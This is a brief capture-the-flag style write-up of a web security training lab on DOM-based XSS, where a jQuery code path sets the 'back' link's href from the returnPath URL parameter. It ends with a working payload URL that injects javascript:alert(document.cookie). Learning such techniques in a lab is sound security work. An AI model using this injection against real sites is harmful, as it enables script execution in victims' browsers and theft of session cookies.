# Lab: DOM XSS in jQuery anchor href attribute sink using location.search source

**End Goal:** Make the "back" link alert ```document.cookie```.

**Analysis**

https://0a4700d70391f827816193cb007e0076.web-security-academy.net/feedback?returnPath=/

*There is the URL and this is how the backlink looks:*

<a id="backLink" href="/">Back</a>

*So, what I have to do is change the URL and then click on the backLink to trigger it.*

*Changing the URL returnPath to alert(document.cookie) just returned 'Not Found' because it didn't read as Javascript.*

**Answer:** 

https://0a4700d70391f827816193cb007e0076.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)


